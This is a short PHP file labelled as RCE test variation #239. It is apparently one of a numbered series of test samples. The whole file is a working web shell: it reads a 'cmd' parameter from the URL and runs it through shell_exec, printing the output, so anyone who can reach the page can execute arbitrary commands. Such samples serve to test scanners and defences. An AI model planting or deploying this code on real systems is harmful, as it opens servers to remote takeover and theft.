<?php
// RCE test variation #239
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>